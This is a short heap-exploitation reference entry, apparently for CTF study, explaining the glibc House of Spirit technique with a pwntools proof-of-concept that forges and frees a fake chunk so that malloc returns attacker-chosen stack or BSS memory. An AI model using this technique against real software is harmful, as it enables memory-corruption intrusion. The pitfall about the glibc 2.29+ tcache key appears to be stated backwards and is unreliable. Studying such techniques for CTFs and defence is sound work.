# House of Spirit

**When**: Can control a pointer that will be passed to `free()`.
**Primitive needed**: Write a pointer value (stack, BSS, or controlled buffer).
**Result**: `malloc` returns a chunk at the attacker-controlled location.

## Mechanism
Forge a fake chunk in memory you control (stack, global). The fake chunk needs a valid size field and a valid "next chunk" after it (to pass glibc sanity checks). Free the fake chunk → it enters tcache/fastbin. Next `malloc` of that size returns the fake chunk's user data area.

## PoC
```python
# IN: ability to free(attacker_controlled_ptr)
# OUT: malloc returns a chunk overlapping the stack/BSS
from pwn import *

context.binary = elf = ELF('./binary')
p = process('./binary')

# Step 1: Forge fake chunk on the stack (or BSS)
# Layout at fake_chunk_addr:
#   [prev_size = 0] [size = 0x41 | PREV_IN_USE] [user_data...]
#   ... 0x30 bytes of user data ...
#   [next_chunk prev_size = 0] [next_chunk size = 0x21 | PREV_IN_USE]
fake = flat(
    0,     0x41,          # fake chunk header (size 0x40, fastbin/tcache)
    b'A' * 0x30,          # user data region
    0,     0x21,          # next chunk header (validates boundary)
)
# Write fake to a known writable address
write_to_addr(target_buf, fake)

# Step 2: Free the fake chunk (pointer = target_buf + 0x10)
free_ptr(target_buf + 0x10)

# Step 3: Allocate — returns target_buf + 0x10
# Now we can write to the stack/BSS via this allocation
alloc(0, 0x38, payload)  # payload overwrites whatever is at target_buf
```

## Trap
- Size must match a valid fastbin or tcache bin (0x20–0x80 on 64-bit for fastbin).
- The "next chunk" at `fake + size` must have a plausible size with PREV_IN_USE set.
- tcache (glibc 2.26+) has weaker checks than fastbin — easier target.
- glibc 2.29+ tcache has a `key` field — forged chunks need the right key or will fail the double-free check.
